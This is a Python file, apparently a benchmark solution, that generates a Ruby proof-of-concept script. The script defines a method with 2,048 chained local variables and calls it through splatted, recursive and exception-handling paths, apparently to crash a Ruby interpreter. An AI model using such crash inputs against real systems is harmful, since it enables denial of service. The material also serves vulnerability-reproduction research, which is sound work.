import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        num_vars = 2048
        var_names = [f"v{i}" for i in range(num_vars)]
        chain = "=".join(var_names) + "=0"
        parts = []
        parts.append("def mass_locals\n  ")
        parts.append(chain)
        parts.append("\nend\n\n")
        parts.append("def caller1\n  mass_locals\nend\n\n")
        parts.append(
            "def caller2(*a)\n"
            "  mass_locals\n"
            "  if a.length < 3\n"
            "    caller2(*(a + Array.new(100, 1)))\n"
            "  end\n"
            "end\n\n"
        )
        parts.append(
            "def caller3(n)\n"
            "  return if n <= 0\n"
            "  begin\n"
            "    mass_locals\n"
            "  rescue\n"
            "  ensure\n"
            "    caller3(n-1)\n"
            "  end\n"
            "end\n\n"
        )
        parts.append("caller1\ncaller2(1)\ncaller3(3)\n")
        script = "".join(parts)
        return script.encode("ascii")